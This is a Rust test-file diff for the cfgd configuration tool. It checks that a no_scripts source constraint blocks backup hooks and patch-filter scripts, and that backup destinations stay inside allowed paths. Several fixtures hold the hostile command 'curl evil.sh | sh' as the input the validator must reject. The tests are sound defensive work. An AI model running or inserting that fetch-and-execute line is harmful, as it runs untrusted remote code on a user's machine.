@@ -327,6 +327,185 @@ fn validate_constraints_scripts_permitted_by_subscriber_opt_in() {
     );
 }
 
+/// A `spec.backups[]` entry with only the required fields filled in.
+fn backup_fixture(name: &str) -> BackupSpec {
+    BackupSpec {
+        name: name.to_string(),
+        source: "~/notes".into(),
+        destination: None,
+        name_pattern: "{filename}.{timestamp}".to_string(),
+        schedule: None,
+        retention: 3,
+        pre_backup: Vec::new(),
+        post_backup: Vec::new(),
+    }
+}
+
+/// A `strategy: Patch` managed file whose merge is computed by running
+/// `script`.
+fn patch_script_file_fixture(target: &str, script: &str) -> ManagedFileSpec {
+    ManagedFileSpec {
+        patch: Some(PatchSpec {
+            format: None,
+            ensure: None,
+            script: Some(script.to_string()),
+        }),
+        source: String::new(),
+        target: target.into(),
+        strategy: Some(FileStrategy::Patch),
+        private: false,
+        origin: None,
+        encryption: None,
+        permissions: None,
+    }
+}
+
+#[test]
+fn validate_constraints_blocks_backup_hooks() {
+    // A backup hook runs on `cfgd apply`, on `cfgd backup run`, and on the
+    // daemon's timer — code execution by any other name.
+    let constraints = SourceConstraints {
+        no_scripts: true,
+        ..Default::default()
+    };
+    for (label, spec) in [
+        (
+            "preBackup",
+            ProfileSpec {
+                backups: vec![BackupSpec {
+                    pre_backup: vec![ScriptEntry::Simple("curl evil.sh | sh".into())],
+                    ..backup_fixture("keys")
+                }],
+                ..Default::default()
+            },
+        ),
+        (
+            "postBackup",
+            ProfileSpec {
+                backups: vec![BackupSpec {
+                    post_backup: vec![ScriptEntry::Simple("curl evil.sh | sh".into())],
+                    ..backup_fixture("keys")
+                }],
+                ..Default::default()
+            },
+        ),
+    ] {
+        let err = match validate_constraints("acme", &constraints, &spec, false) {
+            Ok(()) => panic!("no_scripts must block a {label} hook"),
+            Err(e) => e,
+        };
+        let msg = err.to_string();
+        assert!(
+            msg.contains("acme") && msg.contains(label) && msg.contains("keys"),
+            "the error must name the source, the hook, and the backup: {msg}"
+        );
+        assert!(
+            validate_constraints("acme", &constraints, &spec, true).is_ok(),
+            "allowScripts opt-in must permit a {label} hook"
+        );
+    }
+}
+
+#[test]
+fn validate_constraints_blocks_a_patch_filter_script() {
+    // A patch filter is the widest surface of the three: the merge is computed
+    // by running it, so `cfgd diff` / `status` / `verify` execute it too.
+    let constraints = SourceConstraints {
+        no_scripts: true,
+        ..Default::default()
+    };
+    let spec = ProfileSpec {
+        files: Some(FilesSpec {
+            managed: vec![patch_script_file_fixture(
+                "~/.config/app/x.ini",
+                "curl evil.sh | sh",
+            )],
+            ..Default::default()
+        }),
+        ..Default::default()
+    };
+
+    let err = validate_constraints("acme", &constraints, &spec, false).unwrap_err();
+    let msg = err.to_string();
+    assert!(
+        msg.contains("acme") && msg.contains("patch script") && msg.contains("~/.config/app/x.ini"),
+        "the error must name the source and the patched target: {msg}"
+    );
+    assert!(
+        validate_constraints("acme", &constraints, &spec, true).is_ok(),
+        "allowScripts opt-in must permit a patch filter"
+    );
+}
+
+#[test]
+fn validate_constraints_allows_a_structured_patch_without_a_script() {
+    // `patch.ensure` is a declarative merge, not code — `no_scripts` has no
+    // business rejecting it.
+    let constraints = SourceConstraints {
+        no_scripts: true,
+        ..Default::default()
+    };
+    let spec = ProfileSpec {
+        files: Some(FilesSpec {
+            managed: vec![ManagedFileSpec {
+                patch: Some(PatchSpec {
+                    format: None,
+                    ensure: Some(serde_yaml::from_str("telemetry: false").unwrap()),
+                    script: None,
+                }),
+                ..patch_script_file_fixture("~/.config/app/x.ini", "unused")
+            }],
+            ..Default::default()
+        }),
+        ..Default::default()
+    };
+    assert!(validate_constraints("acme", &constraints, &spec, false).is_ok());
+}
+
+#[test]
+fn validate_constraints_path_containment_covers_backup_destinations() {
+    let constraints = SourceConstraints {
+        allowed_target_paths: vec!["~/.config/acme/".into()],
+        ..Default::default()
+    };
+    let spec = ProfileSpec {
+        backups: vec![BackupSpec {
+            destination: Some("/etc/cron.d".into()),
+            ..backup_fixture("keys")
+        }],
+        ..Default::default()
+    };
+    let err = validate_constraints("acme", &constraints, &spec, false).unwrap_err();
+    let msg = err.to_string();
+    assert!(
+        msg.contains("/etc/cron.d") && msg.contains("acme"),
+        "error should name the offending destination and source: {msg}"
+    );
+}
+
+#[test]
+fn validate_constraints_leaves_the_backup_source_unconstrained() {
+    // Reading a path the allow-list does not cover is the feature's primary
+    // use (`~/.ssh` before a risky apply). The snapshot can only land inside a
+    // `destination`, which IS constrained — here, the default one under the
+    // state dir.
+    let constraints = SourceConstraints {
+        allowed_target_paths: vec!["~/.config/acme/".into()],
+        ..Default::default()
+    };
+    let spec = ProfileSpec {
+        backups: vec![BackupSpec {
+            source: "~/.ssh".into(),
+            ..backup_fixture("keys")
+        }],
+        ..Default::default()
+    };
+    assert!(
+        validate_constraints("acme", &constraints, &spec, false).is_ok(),
+        "a backup's source is a read, not a write, and stays unconstrained"
+    );
+}
+
 #[test]
 fn validate_constraints_path_containment() {
     let constraints = SourceConstraints {
